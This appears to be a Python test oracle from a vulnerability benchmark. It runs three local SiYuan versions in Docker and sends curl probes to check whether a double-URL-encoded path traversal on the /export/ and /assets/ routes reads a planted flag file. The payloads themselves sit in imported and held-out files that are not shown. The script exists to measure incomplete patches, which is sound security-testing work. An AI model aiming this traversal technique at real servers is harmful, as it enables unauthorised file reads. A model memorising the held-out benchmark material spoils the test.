#!/usr/bin/env python3
"""Flag differential oracle for siyuan-double-url-encode-assets-traversal.

REAL-SERVER-HTTP oracle: every probe is an external HTTP GET (curl --path-as-is)
against the REAL, unmodified SiYuan kernel booted from the official b3log/siyuan
image per release tag. Nothing is lifted; the oracle observes the flag-file bytes
in the kernel's real HTTP response.

SIBLING-ROUTE incomplete fix (Variant A, flag_oracle.validate_case):

  original (CVE-2026-41894, /export/ double-URL-encode traversal):
      reaches flag on V0=v3.6.4  ,  BLOCKED on V1=v3.6.5 (IsSubPath guard added -> 401)
  residual (CVE-2026-54066, /assets/ double-URL-encode traversal — the sibling route):
      reaches flag on V1=v3.6.5 (GetAssetAbsPath url.PathUnescape fallback UNCHANGED)
      BLOCKED  on V2=v3.7.0 (fallback removed + IsSensitivePath -> 404)   [negative control]

Both routes are READ verbs traversing to the SAME planted flag file
(<workspace>/pcb_flag.txt), so a single flag channel suffices and Variant A applies:
the CVE-2026-41894 fix closed the /export/ route but left the sibling /assets/ route
double-decoding — an incomplete (sibling-route) fix, closed by CVE-2026-54066.

Usage:
  PCB_FLAG=<token> python3 oracle.py --gate      # envs already up on all ports
  python3 oracle.py --run-gate                     # orchestrate up + gate + down
"""
from __future__ import annotations

import argparse
import json
import os
import subprocess
import sys
import time
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parents[2] / "benchmark"))
from flag_oracle import validate_case, contains_flag, new_flag  # noqa: E402

sys.path.insert(0, str(HERE))
from original_poc import candidate as original_candidate  # noqa: E402

FLAG = os.environ.get("PCB_FLAG") or new_flag()

BASE = {
    "v0": "http://127.0.0.1:38620",   # b3log/siyuan:v3.6.4
    "v1": "http://127.0.0.1:38621",   # b3log/siyuan:v3.6.5  (TARGET / incomplete)
    "v2": "http://127.0.0.1:38622",   # b3log/siyuan:v3.7.0
}

# Readiness probe: a normal asset the entrypoint plants; 200 once the kernel serves.
READY_PATH = "/assets/logo.png"


def run_probe(candidate, *, version="v1"):
    """Send one candidate request with curl --path-as-is (the client must NOT
    normalize the %252e traversal) to the REAL SiYuan kernel. Returns
    {version,path,status,body}."""
    base = BASE[version]
    path = candidate["path"] if isinstance(candidate, dict) else str(candidate)
    proc = subprocess.run(
        ["curl", "--path-as-is", "-sS", "-m", "15", "-w", "\n%{http_code}", f"{base}{path}"],
        text=True, capture_output=True, check=False,
    )
    out = proc.stdout
    status, body = "", out
    if "\n" in out:
        body, status = out.rsplit("\n", 1)
    return {"version": version, "path": path, "status": status, "body": body}


def original_poc(*, version="v1"):
    """[GIVEN] CVE-2026-41894 /export/ traversal on the real kernel.
    Reaches flag on v0, HTTP 401 on v1."""
    return run_probe(original_candidate(), version=version)


def _bypass_candidate():
    from importlib import util as _u
    spec = _u.spec_from_file_location("_bypass", HERE / "_heldout" / "bypass_poc.py")
    mod = _u.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod.candidate()


def bypass_poc(*, version="v1"):
    """[HELD-OUT] CVE-2026-54066 /assets/ sibling-route traversal on the real kernel.
    Lazily imported from _heldout/ so a system run (no _heldout/) can still import
    run_probe / original_poc."""
    return run_probe(_bypass_candidate(), version=version)


def gate() -> dict:
    """Variant A build-time validity gate + V2 negative control. Assumes v0/v1/v2 up."""
    out = validate_case(
        flag=FLAG,
        original_on_v0=original_poc(version="v0"),
        original_on_v1=original_poc(version="v1"),
        bypass_on_v1=bypass_poc(version="v1"),
    )
    residual_on_v2 = bypass_poc(version="v2")
    out["residual_blocked_on_v2"] = not contains_flag(residual_on_v2, FLAG)
    out["gate_passed"] = out.get("passed") and out.get("residual_blocked_on_v2")
    return out


# --------------------------------------------------------------------------- #
# Orchestration (author side; used by --run-gate). Boots the REAL images.
# --------------------------------------------------------------------------- #
def _compose(*args, env=None):
    return subprocess.run(
        ["docker", "compose", *args], cwd=str(HERE), text=True,
        capture_output=True, check=False, env={**os.environ, **(env or {})},
    )


def _profile_flags(profiles):
    flags = []
    for p in profiles:
        flags += ["--profile", p]
    return flags


def _ready(version, tries=120):
    """Poll the real kernel's normal-asset route until it serves (200)."""
    for _ in range(tries):
        proc = subprocess.run(
            ["curl", "-s", "-m", "3", "-o", "/dev/null", "-w", "%{http_code}",
             f"{BASE[version]}{READY_PATH}"],
            text=True, capture_output=True, check=False,
        )
        if proc.stdout.strip() == "200":
            return True
        time.sleep(2)
    return False


def run_gate(keep_up=False) -> dict:
    global FLAG
    FLAG = os.environ.get("PCB_FLAG") or new_flag()
    env = {"PCB_FLAG": FLAG}
    all_profiles = _profile_flags(("v0", "v1", "v2"))
    _compose(*all_profiles, "down", "-v", env=env)
    r = _compose(*all_profiles, "up", "-d", env=env)   # official images: pull, no build
    if r.returncode != 0:
        return {"error": "compose up failed", "stderr": r.stderr[-2000:], "stdout": r.stdout[-2000:]}
    ready = {"v0": _ready("v0"), "v1": _ready("v1"), "v2": _ready("v2")}
    result = gate()
    result["_env_ready"] = ready
    result["_flag"] = FLAG
    if not keep_up:
        _compose(*all_profiles, "down", "-v", env=env)
    return result


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--gate", action="store_true", help="gate against already-up envs (needs PCB_FLAG)")
    ap.add_argument("--run-gate", action="store_true", help="orchestrate compose up + gate + down")
    ap.add_argument("--keep-up", action="store_true")
    a = ap.parse_args()
    if a.run_gate:
        print(json.dumps(run_gate(keep_up=a.keep_up), indent=2))
    else:
        print(json.dumps(gate(), indent=2))
